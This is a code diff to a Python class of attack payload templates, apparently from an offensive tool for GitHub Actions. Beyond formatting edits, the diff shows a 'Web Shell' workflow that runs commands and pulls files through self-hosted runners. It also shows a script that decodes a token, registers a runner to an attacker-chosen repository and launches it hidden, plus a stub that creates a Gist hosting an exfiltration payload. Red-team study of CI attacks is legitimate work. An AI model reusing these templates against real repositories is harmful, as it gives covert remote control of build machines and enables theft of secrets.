@@ -1,6 +1,6 @@
-class Payloads():
-    """Collection of payload template used for various attacks.
-    """
+class Payloads:
+    """Collection of payload template used for various attacks."""
+
     ROR_SHELL = b"""
 name: Web Shell
 run-name: Shell - ${{ inputs.runner }} - ${{ inputs.cmd || inputs.download_file }}
@@ -40,7 +40,7 @@ jobs:
           path: ${{ inputs.download_file }}
           name: result
 """
-    
+
     # Need to make sure we get the OS, Arch, Version right.
     ROR_GIST = """
 REG_TOKEN=`echo "{0}" | base64 -d`
@@ -65,7 +65,7 @@ fi
 mkdir C:\\.actions-runner1; cd C:\\.actions-runner1
 Invoke-WebRequest -Uri https://github.com/actions/runner/releases/download/{3}/{2} -OutFile {2}
 Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory("$PWD/{2}", "$PWD")
-./config.cmd --url https://github.com/{1} --unattended --token {0}
+./config.cmd --url https://github.com/{1} --unattended --token {0} --name "gatox-{5}"
 $env:RUNNER_TRACKING_ID=0
 Start-Process -WindowStyle Hidden -FilePath "./run.cmd"
 """
@@ -90,8 +90,7 @@ fi
 
     @staticmethod
     def create_exfil_payload():
-        """Creates a Gist hosting an exfiltration payload.
-        """
+        """Creates a Gist hosting an exfiltration payload."""
 
         payload = """
 if [[ "$OSTYPE" == "linux-gnu" ]]; then
